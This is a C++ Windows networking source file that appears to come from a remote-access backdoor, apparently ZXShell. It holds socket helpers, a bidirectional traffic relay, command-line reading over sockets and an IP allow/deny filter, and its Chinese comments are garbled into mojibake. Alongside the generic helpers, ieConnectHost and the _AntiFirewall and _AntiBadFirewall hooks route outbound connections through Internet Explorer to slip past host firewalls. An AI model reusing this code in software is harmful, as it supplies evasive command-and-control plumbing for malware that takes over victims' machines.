#define _WIN32_WINNT 0x0500

#include "..\zxsCommon\zxsWinAPI.h"
#include <winsock2.h>
#include <windows.h>
#include <MSTcpIP.h>
#include "common.h"
#include ".\SpoofProcPath.h"
#include "ieCreateSocket.h"
#include "..\zxsCommon\debugoutput.h"


BOOL TurnOnKeepAlive(SOCKET s, int time, int interval)
{
	//KeepAliveʵ��
	tcp_keepalive inKeepAlive = {0}; //�������
	unsigned long ulInLen = sizeof(tcp_keepalive); 

	tcp_keepalive outKeepAlive = {0}; //�������
	unsigned long ulOutLen = sizeof(tcp_keepalive); 

	unsigned long ulBytesReturn = 0; 

	//����socket��keep aliveΪ5�룬���ҷ��ʹ���Ϊ3��
	inKeepAlive.onoff = 1; 
	inKeepAlive.keepaliveinterval = interval; //����KeepAlive̽����ʱ����
	inKeepAlive.keepalivetime = time; //��ʼ�״�KeepAlive̽��ǰ��TCP�ձ�ʱ��

	if (WSAIoctl((unsigned int)s, SIO_KEEPALIVE_VALS,
		(LPVOID)&inKeepAlive, ulInLen,
		(LPVOID)&outKeepAlive, ulOutLen,
		&ulBytesReturn, NULL, NULL) == SOCKET_ERROR) 
	{ 
		return FALSE;
	}

	return TRUE;
}


int SendMessage(SOCKET Socket, const char *fmt, ...)
{
	if(Socket == ~0)
		return 0;
	va_list args;
	int n;
	char TempBuf[8192];
	va_start(args, fmt);
	n = vsprintf(TempBuf, fmt, args);
	va_end(args);

	if(Socket == 0)
	{
		printf("%s", TempBuf);
		return 0;
	}
	return DataSend(Socket, TempBuf, n);
}

char *GetInetIP(char *OutIP)
{
	// Get host adresses
	char addr[16];
	struct hostent * pHost; 
	pHost = gethostbyname(""); 
	for( int i = 0; pHost!= NULL && pHost->h_addr_list[i]!= NULL; i++ ) 
	{
		OutIP[0]=0;
		for( int j = 0; j < pHost->h_length; j++ ) 
		{
			if( j > 0 ) strcat(OutIP,".");
			sprintf(addr,"%u", (unsigned int)((unsigned char*)pHost->h_addr_list[i])[j]);
			strcat(OutIP,addr);
		}
	}
	return OutIP;
}

SOCKET CreateUDPSocket(DWORD *LPIP, WORD *LPPort)
{
	char szIP[32];
	struct sockaddr_in 	UDPServer;
	struct sockaddr_in  in;
	memset(&in,0,sizeof(sockaddr_in));
	int structsize=sizeof(sockaddr_in);
	UDPServer.sin_family=AF_INET;
	//UDPServer.sin_addr.s_addr= INADDR_ANY;
	UDPServer.sin_addr.s_addr= inet_addr(GetInetIP(szIP));
	UDPServer.sin_port=INADDR_ANY;
	SOCKET Locals = ZXSAPI::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if(Locals == SOCKET_ERROR)
	{
		//printf("UDP socket create failed.\n");
		return 0;
	}
	if(ZXSAPI::bind(Locals,(SOCKADDR*)&UDPServer, sizeof(UDPServer)) == SOCKET_ERROR)
	{
		//printf("UDP socket bind failed.\n");
		return 0;
	}
	getsockname(Locals,(struct sockaddr *)&in,&structsize);

	if(LPIP)
		*LPIP = in.sin_addr.s_addr;
	if(LPPort)
		*LPPort = in.sin_port;

	//printf("UDP Bound to %s:%d\r\n", szIP, ntohs(in.sin_port));
	return Locals;
}

int UDPSend(SOCKET s, char *buff, int nBufSize, DWORD dwIP, WORD wPort)
{
	int nBytesLeft = nBufSize;
	int idx = 0, nBytes = 0;
	int iMode = 0;
	ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);

	struct sockaddr_in 	addrin;
	memset(&addrin,0,sizeof(sockaddr_in));

	addrin.sin_family = AF_INET;
	addrin.sin_addr.s_addr = dwIP;
	addrin.sin_port = htons(wPort);

	while(nBytesLeft > 0)
	{
		nBytes = ZXSAPI::sendto(s, &buff[idx], nBytesLeft, 0, (SOCKADDR *)&addrin, sizeof(addrin));
		if(nBytes == SOCKET_ERROR) 
		{
			//printf("Failed to send buffer to socket %d.\r\n", WSAGetLastError());
			return SOCKET_ERROR;
		}
		nBytesLeft -= nBytes;
		idx += nBytes;
	}
	return idx;
}

DWORD TransmitData(LPVOID lparam)
{
	SOCKET *psock = (SOCKET*)lparam;
	SOCKET ClientSock = psock[0];
	SOCKET ServerSock = psock[1];
	char RecvBuf[MAXBUFSIZE];
	int nRecv=0, nSent=0;
	int Result;
	fd_set FdRead;

	while(1)
	{
		FD_ZERO(&FdRead);

		FD_SET(ClientSock,&FdRead);
		FD_SET(ServerSock,&FdRead);
		Result = select(0, &FdRead, NULL, NULL, NULL);
		if(Result <= 0)
			return 0;
		if(FD_ISSET(ServerSock, &FdRead))
		{
			nRecv = ZXSAPI::recv(ServerSock, RecvBuf, MAXBUFSIZE, 0);
			if(nRecv <= 0)
				return 0;
			else
			{
				nSent = DataSend(ClientSock, RecvBuf, nRecv);
				if(nSent != nRecv)
					return 0;
			}
		}
		if(FD_ISSET(ClientSock, &FdRead))
		{
			nRecv = ZXSAPI::recv(ClientSock, RecvBuf, MAXBUFSIZE, 0);
			if(nRecv <= 0)
				return 0;
			else
			{
				nSent = DataSend(ServerSock, RecvBuf, nRecv);
				if(nSent != nRecv)
					return 0;
			}
		}
	}

	return 0;
}

void ForceCloseSocket(SOCKET s)
{
	linger lg = {1, 0};
	setsockopt(s, SOL_SOCKET, SO_LINGER, (const char FAR *)&lg, sizeof(lg));
	closesocket(s);
}

char *DNS(char *HostName)
{
#ifdef _AntiBadFirewall
	AntiBadFirewall antibadfw;
#endif

	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	hostent = gethostbyname(HostName);
	if (hostent == NULL)
	{
		return NULL;
	}
	iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
	return inet_ntoa(iaddr);
}

SOCKET ieConnectHost(char *szIP, WORD wPort)
{
#if defined _DEBUG || !defined _AntiFirewall
	//���԰汾��exe��ֻ��ֱ������
	//û�ж��� _AntiFirewall ������ͨ���ӷ�ʽ
	return ConnectHost(szIP, wPort);
#endif

	IESOCKET ies = {0};

	ies.action = IESOCKET_ACTION_CONNECT;
	ies.af = AF_INET;
	ies.type = SOCK_STREAM;
	ies.protocol = IPPROTO_TCP;
	ies.dwFlags = WSA_FLAG_OVERLAPPED;

	ies.sharePID = GetCurrentProcessId();

	strncpy(ies.host, szIP, 49);
	ies.port = wPort;

	ies.Socket = 0; //��ʼ��Ϊ0


	if(ieCreateSocket(&ies))
		return ies.Socket;

	//ies.Socket Ϊ INVALID_SOCKET ��ʾ�ɹ�ͨ��IEִ�����񣬵�����Ŀ��ʧ��
	//���ies.Socket ��Ϊ 0 �����������IEʧ�ܵȣ�������������ʽ��������
	if(ies.Socket == INVALID_SOCKET)
	{
		return 0;
	}else
	{
		return ConnectHost(szIP, wPort);
	}

}

SOCKET ieConnectHost(DWORD dwIP, WORD wPort)
{
#ifdef _AntiBadFirewall
	AntiBadFirewall antibadfw;
#endif

	char szIP[32];
	sprintf(szIP, "%d.%d.%d.%d", 
		dwIP<<24>>24,dwIP<<16>>24,dwIP<<8>>24,dwIP>>24);

	return ieConnectHost(szIP, wPort);
}

SOCKET ConnectHost(DWORD dwIP, WORD wPort)//����ָ��IP�Ͷ˿�
{
#ifdef _AntiBadFirewall
	AntiBadFirewall antibadfw;
#endif

	SOCKET sockid;
	DWORD errcode;

	if ((sockid = ZXSAPI::socket(PF_INET, SOCK_STREAM,IPPROTO_TCP)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr;
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);
	if (ZXSAPI::connect(sockid,(struct sockaddr*)&srv_addr,sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	return sockid;
error:
	errcode = GetLastError();
	ForceCloseSocket(sockid);//define in portscan
	//closesocket(sockid);
	SetLastError(errcode);
	return 0;

}

SOCKET ConnectHost(char *szIP, WORD wPort)
{
#ifdef _AntiBadFirewall
	AntiBadFirewall antibadfw;
#endif

	if (inet_addr(szIP) != INADDR_NONE)
		return ConnectHost(inet_addr(szIP), wPort);
	else
	{
		if (DNS(szIP) != NULL)
			return ConnectHost(inet_addr(DNS(szIP)), wPort);
		else
			return 0;
	}
}

SOCKET CreateSocket(char *szIP, WORD wPort)//
{
	return CreateSocket(inet_addr(szIP), wPort);
}

SOCKET CreateSocket(DWORD dwIP, WORD wPort)//��dwIP�ϰ�wPort�˿�
{
#ifdef _AntiBadFirewall
	AntiBadFirewall antibadfw;
#endif

	SOCKET sockid;
	DWORD errcode;

	if ((sockid = ZXSAPI::socket(PF_INET, SOCK_STREAM,IPPROTO_TCP)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr = {0};
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);
	if (ZXSAPI::bind(sockid,(struct sockaddr*)&srv_addr,sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	if (ZXSAPI::listen(sockid,3) == SOCKET_ERROR)
		goto error;
	return sockid;
error:
	errcode = GetLastError();
	closesocket(sockid);
	SetLastError(errcode);
	return 0;
}

SOCKET CreateTmpSocket(WORD *wPort)//����һ����ʱ���׽���,ָ��wPort��ô�������ʱ�˿�
{
	struct sockaddr_in srv_addr = {0};
	int addrlen = sizeof(struct sockaddr_in);

	SOCKET s = CreateSocket(INADDR_ANY, 0);
	if(s <= 0)
		goto error;

	if(getsockname(s, (struct sockaddr*)&srv_addr, &addrlen) == SOCKET_ERROR)
		goto error;
	*wPort = ntohs(srv_addr.sin_port);
	return s;
error:
	closesocket(s);
	return 0;
}

BOOL InitSock()
{
	WSADATA wsadata;
	return WSAStartup(MAKEWORD(2,2),&wsadata) == 0;
}

SOCKET DoAccept(SOCKET s, int nTimeOut)
{
	int iMode = 1;//nonzero
	ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);//Enabled Nonblocking Mode

	struct timeval TimeOut;
	fd_set FdRead;
	FD_ZERO(&FdRead);
	FD_SET(s,&FdRead);
	TimeOut.tv_sec  = nTimeOut;//12 sec
	TimeOut.tv_usec = 0;
	if(select(s+1, &FdRead, NULL, NULL, nTimeOut==-1 ? NULL : &TimeOut) <= 0)//����accept��ʱ
		return 0;
	return ZXSAPI::accept(s, NULL, NULL);
}

int SetTimeOut(SOCKET Socket,int nTimeOut)
{   
	fd_set FdRead;
	struct timeval TimeOut;
	FD_ZERO(&FdRead);
	FD_SET(Socket,&FdRead);
	TimeOut.tv_sec  = nTimeOut;
	TimeOut.tv_usec = 0;
	return select(Socket+1,&FdRead,NULL,NULL,(nTimeOut == -1)?NULL:&TimeOut);
}

int RecvMessage(SOCKET Socket, char *RecvBuf, int DataLen, int TimeOut_sec)
{
	int nRetVal, TotalBytesRecv = 0;
	while(TotalBytesRecv < DataLen)
	{
		if(SetTimeOut(Socket, TimeOut_sec) <= 0)
			return 0;
		nRetVal = ZXSAPI::recv(Socket, RecvBuf+TotalBytesRecv, DataLen-TotalBytesRecv, 0);
		if(nRetVal <= 0)
			return 0;
		else
			TotalBytesRecv += nRetVal;
	}
	return DataLen == TotalBytesRecv;
}

int DataSend(SOCKET s, char *DataBuf, int DataLen)//��DataBuf�е�DataLen���ֽڷ���sȥ
{
	int nBytesLeft = DataLen;
	int nBytesSent = 0;
	int ret;
	//set socket to blocking mode
	int iMode = 0;
	ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);
	while(nBytesLeft > 0)
	{
		ret = ZXSAPI::send(s, DataBuf + nBytesSent, nBytesLeft, 0);
		if(ret <= 0)
			break;
		nBytesSent += ret;
		nBytesLeft -= ret;
	}
	return nBytesSent;
}

int GetCmdLine(SOCKET Socket, char *RecvBuf, int BufSize, int nTimeOut)
{
/*    int nRetVal = 0;
	int cmdlen = 0;
	while(1)
	{
		nRetVal = SetTimeOut(Socket, nTimeOut);
		if(nRetVal == SOCKET_ERROR)
		{
			return 0;
		}else if(nRetVal == 0)
		{
			return 0;
		}
		nRetVal = recv(Socket, RecvBuf+cmdlen, MAX_CMD_LEN - cmdlen - 1, 0);
		if(nRetVal <= 0)
			return 0;
		RecvBuf[cmdlen+nRetVal] = '\0';

		char *pCmd = RecvBuf+cmdlen;
		///////////////����β�ַ�������лس������򷵻�
		char *pCR = NULL, *pLF = NULL;
		pCR = strchr(pCmd, '\r');
		if(pCR)
			*pCR = '\0';
		pLF = strchr(pCmd, '\n');
		if(pLF)
			*pLF = '\0';
		if(pCR || pLF)
			return 1;
		//////////////
		cmdlen += nRetVal;
	}
    return 0;*/
    int nRetVal = 0;
	int cmdlen = 0;
	while(cmdlen < BufSize)
	{
		nRetVal = SetTimeOut(Socket, nTimeOut);
		if(nRetVal == SOCKET_ERROR)
		{
			return 0;
		}else if(nRetVal == 0)
		{
			return 0;
		}
		nRetVal = ZXSAPI::recv(Socket, RecvBuf+cmdlen, 1, 0);
		if(nRetVal <= 0)
			return 0;
		RecvBuf[cmdlen+nRetVal] = '\0';
		//////////////
		cmdlen += nRetVal;
		if(cmdlen == 1 && RecvBuf[0] == '\n')
		{
			RecvBuf[0] = 0;
			return 1;
		}
		if(cmdlen >= 2)
		{
			if(RecvBuf[cmdlen-1] == '\n')
			{
				RecvBuf[cmdlen-1] = '\0';
				if(RecvBuf[cmdlen-2] == '\r')
					RecvBuf[cmdlen-2] = '\0';
				return 1;
			}
		}
	}

    return 0;
}

bool SetSocketToBlocking(SOCKET s)
{
	int iMode = 0;
	return ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode) == 0;
}

bool Send_ACK(SOCKET Socket, BYTE b)
{
	SetSocketToBlocking(Socket);
	return ZXSAPI::send(Socket, (char*)&b, 1, 0) == 1;
}

bool Recv_ACK(SOCKET Socket, BYTE b)
{
	BYTE ack;
	SetSocketToBlocking(Socket);
	if(ZXSAPI::recv(Socket, (char*)&ack, 1, 0) == 1)
	{
		if(ack == b)
			return true;
	}
	return false;
}


//ִ��ָ���ڼ�����ж�ָ��
BOOL IsAbort(SOCKET s, char *Cmd)
{
	int Result;
	fd_set FdRead;
	struct timeval TimeOut = {0, 0};
	char RecvBuf[MAX_CMD_LEN];
	FD_ZERO(&FdRead);
	FD_SET(s,&FdRead);
	Result = select(0, &FdRead, NULL, NULL, &TimeOut);
	if(Result == 0)
		return FALSE;
	if(FD_ISSET(s, &FdRead))
	{
		Result = GetCmdLine(s, RecvBuf, sizeof(RecvBuf), -1);
		if(Result <= 0)
			return TRUE;

		if(!stricmp(RecvBuf, Cmd))
			return TRUE;
		else
			return FALSE;
	}else
		return TRUE;
}

int FormatPathString(char *Source, char *Dest, int buflen, bool flag)
{
#define IS_PATH_SEPARATOR(ch) ((ch == '\\') || (ch == '/'))
#define IS_DOT(s) ( s[0] == '.' && ( IS_PATH_SEPARATOR(s[1]) || s[1] == '\0') )
#define IS_DOT_DOT(s) ( s[0] == '.' && s[1] == '.' && ( IS_PATH_SEPARATOR(s[2]) || s[2] == '\0') )

	char ch = flag ? '\\' : '/';
	char *lpRetBuf = Dest;
	char *lproot = Dest;
	bool IsGetlpRoot = false;
	while ( *Source ) {
		switch ( *Source ) {

		case '\\' :
		case '/' :
			if  ( *(Dest-1) != ch ) {
				if(!IsGetlpRoot)
				{
					lproot = Dest;
					IsGetlpRoot = true;
				}
				*Dest++ = ch;

				if(Dest - lpRetBuf >= buflen -1)
					goto exit;
			}
			Source++;
			break;
            case '.' :
                //
                // Ignore dot in a leading //./
                // Eat single dots as in /./
                // Double dots back up one level as in /../
                // Any other . is just a filename character
                //

                if ( IS_DOT(Source) ) {
                    Source++;
                    if (IS_PATH_SEPARATOR(*Source)) {
                        Source++;
                        }
                    break;
                    }
                else if ( IS_DOT_DOT(Source) ) {

                    //
                    // backup destination string looking for
                    // a \
                    //

                    while (*Dest != ch && Dest > lpRetBuf)
						Dest--;

                    //
                    // backup to previous component..
                    // \a\b\c\.. to \a\b
                    //

                    do {

                        //
                        // If we bump into root prefix, then
                        // stay at root
                        //

                        if (Dest == lproot) {
                            break;
                            }

                        Dest--;

                        } while (*Dest != ch);
                    if ( Dest ==  lproot && *Dest == ch) {
                        Dest++;
                        }

                    //
                    // Advance source past ..
                    //

                    Source += 2;

                    break;
                    }

                //
                // FALLTHRU
                //
		default:
			while ( *Source && !IS_PATH_SEPARATOR(*Source)) {
				*Dest++ = *Source++;

				if(Dest - lpRetBuf >= buflen -1)
					goto exit;
			}
		}
	}
exit:
	*Dest = '\0';
	return Dest - lpRetBuf;
}

unsigned long getsockdwIP(SOCKET s)
{
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	if(getpeername(s, (SOCKADDR *)&clientaddr, &addrlen) == SOCKET_ERROR)
		return 0;
	return clientaddr.sin_addr.S_un.S_addr;
}

unsigned short getsockport(SOCKET s)
{
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	if(getpeername(s, (SOCKADDR *)&clientaddr, &addrlen) == SOCKET_ERROR)
		return 0;
	return ntohs(clientaddr.sin_port);
}

//"c:\windows\notepad.exe" return "c:\windows\"
char *GetPath(char *FullPath, char *Path)
{
	char *sp = FullPath;
	int Len=0;
	sp += strlen(FullPath) - 1;
	while(*sp != '\\' && sp > FullPath){
		sp--;
		Len++;
	}
	strncpy(Path, FullPath, strlen(FullPath)-Len);
	Path[strlen(FullPath)-Len] = '\0';
	return Path;
}

/*
��Source�ַ�������ָ��char�ֶ�д�絽Dest�������С�
����ֵΪSource�е���һ���ε����ָ��
��:
Source = "1234  , 321, 43,333"
Dest���õ� "1234"
����ָ��ָ��" 321, 43,333"
*/
/*
const char *TakeOutStringByChar(IN const char *Source, OUT char *Dest, int buflen, char ch)
{
	if(Source == NULL)
		return NULL;

	const char *p = strchr(Source, ch);

	while(*Source == ' ')
		Source++;
	for(int i=0; i<buflen && *(Source+i) && *(Source+i) != ch; i++)
	{
		Dest[i] = *(Source+i);
	}
	if(i == 0)
		return NULL;
	else
		Dest[i] = '\0';

	const char *lpret = p ? p+1 : Source+i;

	while(Dest[i-1] == ' ' && i>0)
		Dest[i---1] = '\0';

	return lpret;
}
*/

const char *TakeOutStringByChar(IN const char *Source, OUT char *Dest, int buflen, char ch, bool space)
{
	if(Source == NULL)
		return NULL;

	const char *p = strchr(Source, ch);

	if(space == false)
	{
		while(*Source == ' ')
			Source++;
	}

	int i=0;

	for(i=0; i<buflen && *(Source+i) && *(Source+i) != ch; i++)
	{
		Dest[i] = *(Source+i);
	}
	if(i == 0)
		return NULL;
	else
		Dest[i] = '\0';

	const char *lpret = p ? p+1 : Source+i;

	if(space == false)
	{
		while(Dest[i-1] == ' ' && i>0)
			Dest[i---1] = '\0';
	}

	return lpret;
}

//destIP = "22.22.22.1-22.22.*"
BOOL Is_szIP_in_range(char *sourceIP, char *destIP)
{
	BOOL flag = TRUE;
	char *sip = sourceIP;
	char *dip = destIP;
	while(sip && dip)
	{
		if(*dip == '*')
			break;
		if(*sip != *dip)
		{
			flag = FALSE;
			break;
		}
		if(*sip =='\0' && *dip == '\0')
			break;
		sip++;
		dip++;
	}
	return flag;
}

//destIP = "22.22.22.1-22.22.22.7"
BOOL Is_dwIP_in_range(char *sourceIP, char *destIP)
{
	const char *nextip;
	char startip[32], endip[32];

	nextip = TakeOutStringByChar(destIP, startip, sizeof(startip), '-');

	if(nextip)
		TakeOutStringByChar(nextip, endip, sizeof(endip), NULL);
	else
		return FALSE;

	DWORD dwIP, srcIP, IP_start, IP_end;

	dwIP = inet_addr(sourceIP);
	if(dwIP == INADDR_NONE)
		return FALSE;

	srcIP = ntohl(dwIP);

	dwIP = inet_addr(startip);
	if(dwIP == INADDR_NONE)
		return FALSE;

	IP_start = ntohl(dwIP);

	dwIP = inet_addr(endip);
	if(dwIP == INADDR_NONE)
		return FALSE;

	IP_end = ntohl(dwIP);

	if(srcIP >= IP_start && srcIP <= IP_end)
		return TRUE;
	else
		return FALSE;
}

BOOL Is_IP_in_range(char *sourceIP, char *destIP)
{
	if(strchr(destIP, '-'))//example: xx.xx.xx.1-xx.xx.xx.5
	{
		if(Is_dwIP_in_range(sourceIP, destIP))
			return TRUE;
		else
			return FALSE;
	}else//example: 202.96.*
	{
		if(Is_szIP_in_range(sourceIP, destIP))
			return TRUE;
		else
			return FALSE;
	}
}

BOOL IP_Filter(SOCKET s, const char *AllowedIP, const char *DeniedIP)
{
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	if(getpeername(s, (SOCKADDR *)&clientaddr, &addrlen) == SOCKET_ERROR)
		return FALSE;
	IN_ADDR iaddr = clientaddr.sin_addr;
	char *IP = inet_ntoa(iaddr);
	char filterIP[64] = {0};
	BOOL IsAllowed;
	const char *p;
	p = TakeOutStringByChar(AllowedIP, filterIP, sizeof(filterIP), ',');
	if(p)
		IsAllowed = FALSE;
	else
		IsAllowed = TRUE;
	while(p)
	{
		if(Is_IP_in_range(IP, filterIP))
		{
			IsAllowed = TRUE;
			break;
		}
		p = TakeOutStringByChar(p, filterIP, sizeof(filterIP), ',');
	}
	p = DeniedIP;
	while(p = TakeOutStringByChar(p, filterIP, sizeof(filterIP), ','))
	{
		if(Is_IP_in_range(IP, filterIP))
			return FALSE;
	}
	return IsAllowed;
}

